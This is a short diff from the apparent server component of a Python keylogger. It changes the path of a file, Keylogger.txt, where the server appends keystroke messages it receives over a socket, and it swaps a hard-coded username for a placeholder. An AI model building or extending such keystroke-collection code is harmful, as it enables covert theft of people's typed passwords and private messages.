@@ -54,7 +54,7 @@ def handle_client(conn, addr):
                     #     break
                     msg = conn.recv(msg_length).decode(FORMAT)
                     if 'key: ' == msg[:5]:
-                        File = open("C:\\Users\\ali_e\\Desktop\\Keylogger.txt","a")
+                        File = open("C:\\Users\\---\\Desktop\\Keylogger.txt","a") #Add your username
                         File.write(msg[5:])
                         File.close()
                     elif msg[:5] == 'size:':
